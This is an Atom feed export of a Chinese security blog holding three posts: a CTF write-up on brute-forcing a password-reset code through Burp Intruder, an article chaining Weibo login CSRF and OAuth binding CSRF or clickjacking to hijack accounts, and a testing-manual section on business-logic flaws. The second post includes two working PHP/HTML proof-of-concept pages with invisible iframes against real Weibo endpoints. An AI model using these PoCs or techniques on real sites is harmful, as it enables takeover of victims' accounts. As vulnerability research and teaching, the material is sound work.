<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-06-17T22:10:39+08:00</updated><id>http://localhost:4000/</id><title type="html">Vulkey_Chen’s Blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</subtitle><entry><title type="html">密码重置思路-小密圈的一道题</title><link href="http://localhost:4000/archives/2018-05-05/1" rel="alternate" type="text/html" title="密码重置思路-小密圈的一道题" /><published>2018-05-05T00:00:00+08:00</published><updated>2018-05-05T00:00:00+08:00</updated><id>http://localhost:4000/archives/2018-05-05/hackrestpwd</id><content type="html" xml:base="http://localhost:4000/archives/2018-05-05/1">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;考验技能：黑盒逻辑思考思维&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;提示：http://gh0st.cn/archives/2018-04-18/1 （文中出现过这个思路）&lt;/p&gt;

&lt;p&gt;题目链接：已经下线（密码重置）&lt;/p&gt;

&lt;p&gt;一般来说，很多人应该先走一遍流程：&lt;/p&gt;

&lt;h2 id=&quot;走流程&quot;&gt;走流程&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;验证码发送&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x01.png&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;返回包：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x02.png&quot; alt=&quot;0x02&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;验证码验证&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x03.png&quot; alt=&quot;0x03&quot; /&gt;&lt;/p&gt;

&lt;p&gt;错误返回：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x04.png&quot; alt=&quot;0x04&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;流程分析&quot;&gt;流程分析&lt;/h2&gt;

&lt;h3 id=&quot;察言观色&quot;&gt;察言观色&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x06.png&quot; alt=&quot;0x06&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如上是发送验证码请求对应的响应报文，从报文可以获取到如下的信息：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;后端验证验证码的方式是基于SESSION会话ID的&lt;/li&gt;
  &lt;li&gt;验证码的形势是4位数纯数字&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;缺陷发现&quot;&gt;缺陷发现&lt;/h3&gt;

&lt;p&gt;四位数纯数字，爆破一下？可是问题来了~&lt;/p&gt;

&lt;p&gt;错误三次之后就提示失效了验证码：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x05.png&quot; alt=&quot;0x05&quot; /&gt;&lt;/p&gt;

&lt;p&gt;怎么办？这是一道考思维的题目，国内太多的逻辑漏洞的文章了，可是大多数人学习的是1:1的学习，不会变通。逻辑漏洞不仅仅存在于固有的业务逻辑上，还有代码逻辑~打开你的黑盒测试思维，任何点你都只能猜测，所以为什么不多猜猜？&lt;/p&gt;

&lt;p&gt;文章中写过会有万能密码的存在：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x07.png&quot; alt=&quot;0x07&quot; /&gt;&lt;/p&gt;

&lt;p&gt;测试下在这里并不存在，没有这样的缺陷，这时候你就需要考虑更多的东西，不要做个“表面性”测试的“白帽子”~&lt;/p&gt;

&lt;p&gt;之前说了错误三次验证码会失效，但是否是真的失效了？假设没有失效只是“表面性”的输出失效呢？&lt;/p&gt;

&lt;p&gt;思考后台代码逻辑，参考我提示中链接的文章：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x08.png&quot; alt=&quot;0x08&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这里代入到密码重置这一环节是否有用呢？来测试下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x09.png&quot; alt=&quot;0x09&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里多了一线生机，因为提示了密码错误，而不是失效，那么是否能借助这个来绕过次数限制呢？&lt;/p&gt;

&lt;p&gt;在这里你可以选择使用Python来帮助你，但我认为这完全没必要，因为BurpSuite解决了一切：&lt;/p&gt;

&lt;p&gt;数据包发送到intruder模块，设置attack type为Pitchfork，设置好payload位置：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x10.png&quot; alt=&quot;0x10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pitchfork的工作模式是多组的，如上我设置了两个payload位置，使用这个模式需要两个payload的数量是一样的，发送的请求为A[1]对B[1]。&lt;/p&gt;

&lt;p&gt;设置payload：&lt;/p&gt;

&lt;p&gt;第一个为字符块（Character blocks）-这种类型的Payload是指使用一个给出的输入字符串，根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。&lt;/p&gt;

&lt;p&gt;第二个为数字（Numbers）-这种类型的Payload是指根据配置，生成一系列的数字作为Payload。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x11.png&quot; alt=&quot;0x11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;测试发现真实可用：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-05-05/0x12.png&quot; alt=&quot;0x12&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;

&lt;p&gt;黑盒测试的精华是什么？Fuzzing.&lt;/p&gt;

&lt;p&gt;你现在掌握的思路归根到底都是Fuzzing的结晶。&lt;/p&gt;

&lt;p&gt;在漏洞挖掘中打开你的思维，加油~&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">前言</summary></entry><entry><title type="html">CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限</title><link href="http://localhost:4000/archives/2018-04-28/1" rel="alternate" type="text/html" title="CSRF之你登陆我的账号#业务逻辑组合拳劫持你的权限" /><published>2018-04-28T00:00:00+08:00</published><updated>2018-04-28T00:00:00+08:00</updated><id>http://localhost:4000/archives/2018-04-28/CSRF-Login-Hijacking-Account</id><content type="html" xml:base="http://localhost:4000/archives/2018-04-28/1">&lt;p&gt;作者: 启明星辰(江苏)-Vulkey_Chen, 米斯特安全攻防实验室&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;这是一个理论上通杀很多大型企业网站的漏洞缺陷~&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;可能很多朋友点击来看见标题就觉得，&lt;code class=&quot;highlighter-rouge&quot;&gt;这家伙在吹牛逼了我倒要看看这货能怎么吹,CSRF之登陆我的账号能有啥玩意危害？ &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;先按奈住你心中不屑的情绪，听我慢慢道来~&lt;/p&gt;

&lt;h2 id=&quot;通用业务功能分析&quot;&gt;通用业务功能分析&lt;/h2&gt;

&lt;p&gt;最近很喜欢挖一些通用漏洞（不是程序通用，而是功能通用），会经常拿着BAT三家以及其他一些大型网站进行业务功能点的对比，来看看有哪些是共用的功能点，这边列出以下的几条：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;QQ快捷登陆&lt;/li&gt;
  &lt;li&gt;微信快捷登陆&lt;/li&gt;
  &lt;li&gt;微博快捷登陆&lt;/li&gt;
  &lt;li&gt;其他……&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x00.png&quot; alt=&quot;0x00.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OAuth2.0认证缺陷-快捷登陆账号劫持的问题具体可以参考：http://gh0st.cn/archives/2018-02-12/1 （&lt;strong&gt;来自i春秋社区&lt;/strong&gt;）&lt;/p&gt;

&lt;p&gt;这种问题其实需要一定的运气因为很多的快捷登陆有state参数的干扰，所以是完全没办法去利用的。&lt;/p&gt;

&lt;p&gt;在这里我尝试能不能挖到一个新的缺陷，在走正常的快捷登陆流程时我发现需要绑定这个网站的账号才可以正常的使用用户的功能，这时候反着想网站的用户中心是否有第三方的账号绑定？&lt;/p&gt;

&lt;p&gt;这里找了大部分的网站都有这样的功能（第三方账号绑定，绑定了即可使用第三方账号直接登陆），找到了这个功能点就可以来测试，先走一遍正常的绑定流程：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;点击绑定第三方账号&lt;/li&gt;
  &lt;li&gt;进入第三方账号绑定页面&lt;/li&gt;
  &lt;li&gt;（如果第三方账号是登陆状态）-&amp;gt;需要点击授权按钮；(如果第三方账号是未登陆状态)-&amp;gt;需要输入第三方的账号密码登陆-&amp;gt;点击授权按钮&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x01.png&quot; alt=&quot;0x01.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;设立猜想&quot;&gt;设立猜想&lt;/h2&gt;

&lt;p&gt;梳理了流程之后，一个很骚的思路就从脑子里蹦了出来：&lt;/p&gt;

&lt;p&gt;有第三方账号绑定这个功能，登陆处也有第三方账号登陆功能，也就是说绑定第三方账号代表着权限分享给了第三方账号。&lt;/p&gt;

&lt;p&gt;猜想建立-&amp;gt;如果我有第三方账号所在网站的&lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF之你登陆我的账号&lt;/code&gt;缺陷，让受害者先登陆我的第三方账号（为了避免损失，我可以注册一个小号），然后绑定处也有CSRF绑定的缺陷或者点击劫持问题，那么我就可以让受害者绑定我的第三方账号，然后根据我的第三方账号来登陆受害者的账号，劫持到其权限。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x02.png&quot; alt=&quot;0x02.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;验证猜想&quot;&gt;验证猜想&lt;/h2&gt;

&lt;h3 id=&quot;流程&quot;&gt;流程&lt;/h3&gt;

&lt;p&gt;个人中心有这个第三方的账号绑定：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x03.png&quot; alt=&quot;0x03.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这里QQ、github、微博、微信四个第三方账号绑定中我有了微博的&lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF之你登陆我的账号&lt;/code&gt;这个缺陷，所以这里测试下微博的第三方账号绑定。&lt;/p&gt;

&lt;p&gt;页面有微博账号绑定的跳转链接：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x04.png&quot; alt=&quot;0x04&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过这个链接进入了绑定的界面（未登陆微博）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x05.png&quot; alt=&quot;0x05.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过这个链接进入了绑定的界面（已登陆微博）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x06.png&quot; alt=&quot;0x06.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当我授权绑定之后，微博发生了变化，管理中心-&amp;gt;我的应用-&amp;gt;我的应用：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x07.png&quot; alt=&quot;0x07.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;会多出这个网站在里面，那么这个变化是对我们有利的，还是？&lt;/p&gt;

&lt;p&gt;这里我解绑了微博，然后再使用这个已经授权了的微博进行绑定，发现居然不用点击授权了，直接就绑定了。&lt;/p&gt;

&lt;p&gt;很显然，在这里这个&lt;code class=&quot;highlighter-rouge&quot;&gt;便利&lt;/code&gt;解决了一些攻击的利用难度。&lt;/p&gt;

&lt;h3 id=&quot;实现&quot;&gt;实现&lt;/h3&gt;

&lt;p&gt;我们现在具备的几个条件：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;微博的&lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF之你登陆我的账号&lt;/code&gt;缺陷：&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;登陆你的微博，然后访问http://login.sina.com.cn/sso/crossdomain.php?action=login，会返回这样的内容给你：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x08.png&quot; alt=&quot;0x08.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其中arrURL对应的链接就是凭证登陆的~&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;你的微博已经授权过了要存在缺陷的网站(这里方便直接跳转而不用再去点击按钮！所以你可以先用自己的微博绑定下存在缺陷的网站的账号，然后解绑就行了~)&lt;/li&gt;
  &lt;li&gt;绑定请求存在csrf的缺陷（这里因为是GET请求类型 &lt;code class=&quot;highlighter-rouge&quot;&gt;/oauth/weibo/redirect&lt;/code&gt;，而一般不会对GET请求类型进行CSRF的限制~~）&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;场景1攻击步骤&quot;&gt;场景1.攻击步骤：&lt;/h4&gt;

&lt;p&gt;对方点开凭证链接登陆了你的微博，对方点开绑定微博的链接，绑定了你的微博，完成攻击。&lt;/p&gt;

&lt;p&gt;考虑到凭证时效性的问题，在这里写了一个动态的PoC：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php
//get weibo login token
$curl = curl_init();
$cookie = &quot;你微博的Cookie&quot;;
curl_setopt($curl, CURLOPT_URL, 'http://login.sina.com.cn/sso/crossdomain.php?action=login');
curl_setopt($curl, CURLOPT_HEADER, 1);
curl_setopt($curl, CURLOPT_COOKIE, $cookie);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($curl);
curl_close($curl);
//echo $data;
$t = preg_match('/ticket=(.*?)&amp;amp;sso/', $data, $res);
$url = &quot;https://passport.weibo.com/wbsso/login?ticket={$res[1]}&amp;amp;ssosavestate=1556602678&quot;;
?&amp;gt;

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;style type=&quot;text/css&quot;&amp;gt; 
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: &quot;progid:DXImageTransform.Microsoft.Alpha(Opacity=0)&quot;; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div class=&quot;testframe&quot;&amp;gt;
	&amp;lt;iframe id=&quot;test0&quot; src=&quot;&amp;lt;?php echo $url;?&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;script&amp;gt;
function loadsrc(){
    document.getElementById(&quot;test0&quot;).src=&quot;https://gh0st.cn/oauth/weibo/redirect&quot;;
}
setTimeout(&quot;loadsrc()&quot;,2000);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;场景2攻击步骤&quot;&gt;场景2.攻击步骤：&lt;/h4&gt;

&lt;p&gt;有些网站可能是post请求限制了referer或者根本没有跳转的请求而是直接进入了微博的绑定界面，因为state参数的原因导致根本无法以这个绑定页面为链接的形式去做攻击~&lt;/p&gt;

&lt;p&gt;可能有很多朋友就有疑问了，为什么我老是提到state参数？这个参数是干什么用的呢？这里参考下微博的OAuth2.0接口的开发文档：&lt;/p&gt;

&lt;p&gt;http://open.weibo.com/wiki/Oauth2/authorize&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x09.png&quot; alt=&quot;0x09.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;是防止CSRF的，也就是说在这里如果绑定的链接是如下这样子的：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x10.png&quot; alt=&quot;0x10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;没有state参数验证的，那么你可以直接以此作为绑定链接，&lt;strong&gt;覆盖场景1中PoC里面的这个链接&lt;/strong&gt;:&lt;code class=&quot;highlighter-rouge&quot;&gt;https://gh0st.cn/oauth/weibo/redirect&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;好了，说了那么多跟场景2没用的话，切入主题来说说场景2的情况到底该如何完成攻击？&lt;/p&gt;

&lt;p&gt;很简单我们可以使用点击劫持来完成攻击，如下动态的PoC：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php
//get weibo login token
$curl = curl_init();
$cookie = &quot;你微博的Cookie&quot;;
curl_setopt($curl, CURLOPT_URL, 'http://login.sina.com.cn/sso/crossdomain.php?action=login');
curl_setopt($curl, CURLOPT_HEADER, 1);
curl_setopt($curl, CURLOPT_COOKIE, $cookie);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$data = curl_exec($curl);
curl_close($curl);
//echo $data;
$t = preg_match('/ticket=(.*?)&amp;amp;sso/', $data, $res);
$url = &quot;https://passport.weibo.com/wbsso/login?ticket={$res[1]}&amp;amp;ssosavestate=1556602678&quot;;
?&amp;gt;

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;style type=&quot;text/css&quot;&amp;gt; 
.testframe {
	height: 100%;
} 
iframe {
	height: 100%;
	width: 100%;
	border: 0;
	margin: 0;
	padding: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: &quot;progid:DXImageTransform.Microsoft.Alpha(Opacity=0)&quot;; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
.btn {
    position: fixed;
    width: 70px;
    height: 22px;
    left: 167px;
    right: 0;
    display:block;
    top: 295px;
} 
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div class=&quot;testframe&quot;&amp;gt;
    &amp;lt;input type=&quot;button&quot; class=&quot;btn&quot; value=&quot;Click&quot;&amp;gt;
	&amp;lt;iframe id=&quot;test0&quot; src=&quot;&amp;lt;?php echo $url;?&amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;script&amp;gt;
function loadsrc(){
	document.getElementById(&quot;test0&quot;).src=&quot;https://gh0st.cn/usercenter/ubind&quot;;
}
setTimeout(&quot;loadsrc()&quot;,2000);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;简单的说明下这个PoC的用处：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-04-28/0x11.png&quot; alt=&quot;0x11.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;

&lt;p&gt;可能把每一项单独的拎出来会发现这并没有缺陷，但是一旦参与到了业务逻辑中，就一定会存在一定的问题。&lt;/p&gt;

&lt;p&gt;不要看不起一个看似没危害的漏洞甚至一个缺陷，因为你永远不知道它能发挥的巨大危害。&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">作者: 启明星辰(江苏)-Vulkey_Chen, 米斯特安全攻防实验室</summary></entry><entry><title type="html">Web安全测试学习手册-业务逻辑测试</title><link href="http://localhost:4000/archives/2018-04-18/1" rel="alternate" type="text/html" title="Web安全测试学习手册-业务逻辑测试" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>http://localhost:4000/archives/2018-04-18/WebManual-1</id><content type="html" xml:base="http://localhost:4000/archives/2018-04-18/1">&lt;p&gt;首先感谢朋友倾璇的邀请 http://payloads.online/archivers/2018-03-21/1 ，参与了&lt;web安全测试学习手册&gt;的相关撰写，目前负责业务逻辑测试这一块的撰写，目前初步已经成型，先发出来让大家看看，欢迎点评，也可以加入我们一起来撰写~&lt;/web安全测试学习手册&gt;&lt;/p&gt;

&lt;h1 id=&quot;业务逻辑测试&quot;&gt;业务逻辑测试&lt;/h1&gt;

&lt;p&gt;介绍：这里对Web应用业务逻辑方面的安全缺陷进行介绍和常见案例讲解。
&lt;!-- more --&gt;&lt;/p&gt;

&lt;h2 id=&quot;任意用户密码重置&quot;&gt;任意用户密码重置&lt;/h2&gt;

&lt;h3 id=&quot;常见的缺陷&quot;&gt;常见的缺陷&lt;/h3&gt;

&lt;h4 id=&quot;-1验证码类缺陷&quot;&gt;* 1.验证码类缺陷&lt;/h4&gt;

&lt;p&gt;-场景：
1.1 验证码回显在客户端(响应主体、Set-Cookie等等…)。&lt;/p&gt;

&lt;p&gt;1.2 验证码过于简易时效性过长，接口未做限制(一般为纯数字4-8位数，时效性长达30分钟以上可以对验证码进行枚举)。&lt;/p&gt;

&lt;h4 id=&quot;-2未校验权限前端校验越权&quot;&gt;* 2.未校验权限/前端校验/越权&lt;/h4&gt;

&lt;p&gt;-场景：
2.1 任意手机号验证码都可重置任意账号。&lt;/p&gt;

&lt;p&gt;2.2 修改响应包的主体(根据实际情况来修改 例如验证请求对应的响应报文的主体为&lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt; 你可以修改为&lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;)。&lt;/p&gt;

&lt;p&gt;2.3 同一浏览器进入A用户的重置，然后关闭再进入B用户的重置 而实际上重置A用户。&lt;/p&gt;

&lt;p&gt;2.4 修改重置密码的相关参数(例如 userid等等…)。&lt;/p&gt;

&lt;h4 id=&quot;-3host头伪造&quot;&gt;* 3.HOST头伪造&lt;/h4&gt;

&lt;p&gt;-场景：
3.1 在邮箱找回密码的时候，可以简单替换Host部分进行Fuzz，看看找回密码的链接中的域名是否是根据Host来生成的如果是可以替换成自己的域名。但是这种思路很鸡肋，因为需要用户的点击，这样才可以根据日志看到重置密码的链接，万一重置密码的链接时效性过去就无奈了。&lt;/p&gt;

&lt;h4 id=&quot;-4找回密码的凭证脆弱&quot;&gt;* 4.找回密码的凭证脆弱&lt;/h4&gt;

&lt;p&gt;-场景：
4.1 见过最多的是找回密码的token是base64编码的，而解码后的明文根据其规则修改就可以成为别人用户找回密码的凭证了。&lt;/p&gt;

&lt;h2 id=&quot;验证码绕过&quot;&gt;验证码绕过&lt;/h2&gt;

&lt;h3 id=&quot;常见的缺陷-1&quot;&gt;常见的缺陷&lt;/h3&gt;

&lt;h4 id=&quot;图形类验证码绕过&quot;&gt;图形类验证码绕过&lt;/h4&gt;

&lt;h5 id=&quot;-1图形验证码可复用&quot;&gt;* 1.图形验证码可复用&lt;/h5&gt;

&lt;p&gt;-场景：
3.1 验证码刷新之后，而历史刷新的验证码还是可以继续使用。&lt;/p&gt;

&lt;p&gt;3.2 验证码使用过后不刷新，时效性不过期，可以一直复用。&lt;/p&gt;

&lt;h5 id=&quot;-2图形验证码易识别&quot;&gt;* 2.图形验证码易识别&lt;/h5&gt;

&lt;p&gt;-场景
4.1 很多验证码的显示很简单，容易被机器识别。&lt;/p&gt;

&lt;h4 id=&quot;短信类验证码绕过&quot;&gt;短信类验证码绕过&lt;/h4&gt;

&lt;h5 id=&quot;-1验证码过于简易接口未限制&quot;&gt;* 1.验证码过于简易&amp;amp;接口未限制&lt;/h5&gt;

&lt;p&gt;-场景：
1.1 有些手机短信验证码都为 4-8位 纯数字的验证码，在接口没有任何限制的情况下是可以直接爆破的。&lt;/p&gt;

&lt;h5 id=&quot;-2验证码发送复用时效性过长接口未限制&quot;&gt;* 2.验证码发送复用&amp;amp;时效性过长&amp;amp;接口未限制&lt;/h5&gt;

&lt;p&gt;-场景：
2.1 6位数验证码时效性为5分钟，但是在这里同一手机号发送的验证码都是一样的，所以可以在4分钟的时候重新发送一次验证码这样验证码就又有效了，因为验证码一直在被复用，所以可以爆破。&lt;/p&gt;

&lt;h5 id=&quot;-3万能验证码&quot;&gt;* 3.万能验证码&lt;/h5&gt;

&lt;p&gt;-场景：
3.1 这是很多大企业的诟病，在未上线前为了方便测试加了&lt;code class=&quot;highlighter-rouge&quot;&gt;888888&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;000000&lt;/code&gt;这样的万能验证码但是上线后没去删除测试的内容导致被恶意利用。&lt;/p&gt;

&lt;h2 id=&quot;短信语音验证码重放&quot;&gt;短信/语音验证码重放&lt;/h2&gt;

&lt;p&gt;无论是发送短信还是语音验证码来做验证，都是需要手机号的，而发送验证码实际上是需要成本的，需要跟运营商或者是第三方验证码平台进行合作，多数验证码为0.01元一条，当然也有更便宜的，所以这边的问题也会影响到一个企业的资产方面。&lt;/p&gt;

&lt;h3 id=&quot;常见缺陷&quot;&gt;常见缺陷&lt;/h3&gt;

&lt;h4 id=&quot;-1无限制发送&quot;&gt;* 1.无限制发送&lt;/h4&gt;

&lt;p&gt;-场景：
1.1 厂商对验证码发送这一块并没有进行限制时间发送&lt;/p&gt;

&lt;h4 id=&quot;-2代码层逻辑校验问题&quot;&gt;* 2.代码层逻辑校验问题&lt;/h4&gt;

&lt;p&gt;-场景：
2.1 很多厂商会对手机号进行限制，如果60秒内发送过就不会发送，但是程序员在设计代码层的逻辑时会出现很多奇葩的问题，例如其为了方便用户体验，正常的代码层的流程为：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;a.去除用户手误输入的空格以及一些特殊符号&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;b.验证手机号是否发送过验证码&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;某些程序员会这样设计流程：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;a.验证手机号是否发送过验证码（发送过则不放行 没发送过则进入下一步）&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;b.去除用户手误输入的空格以及一些特殊符号&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;c.发送手机号验证码&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;-3手机号可遍历发送&quot;&gt;* 3.手机号可遍历发送&lt;/h4&gt;

&lt;p&gt;-场景：
3.1 我之前有提到验证码发送会影响到企业资产，那么发送验证码限制就不能仅仅针对于单一手机号的限制，例如我可以载入一堆手机号的字典，然后直接遍历发送验证码，这也是危害之一。&lt;/p&gt;

&lt;h2 id=&quot;业务流程绕过&quot;&gt;业务流程绕过&lt;/h2&gt;

&lt;h3 id=&quot;常见缺陷-1&quot;&gt;常见缺陷&lt;/h3&gt;

&lt;h5 id=&quot;-1无验证步骤跳跃&quot;&gt;* 1.无验证步骤跳跃&lt;/h5&gt;

&lt;p&gt;-场景：
1.1 出现的场景很多：密码重置步骤、支付步骤，对于这种的测试方法有很多中：&lt;/p&gt;

&lt;p&gt;a.对比法，使用A、B两个账号，A账号先正常走一遍流程，然后记录流程的请求报文跟响应报文，使用B账号来测试是否能绕过直接进入最后一步骤。&lt;/p&gt;

&lt;p&gt;b.第六感，假设步骤1的网址为:&lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.test.com/step1&lt;/code&gt;，这时候你可以凭借你的第六感修改下链接为&lt;code class=&quot;highlighter-rouge&quot;&gt;/step2&lt;/code&gt;之类的来测试。&lt;/p&gt;

&lt;h2 id=&quot;加密算法脆弱&quot;&gt;加密算法脆弱&lt;/h2&gt;

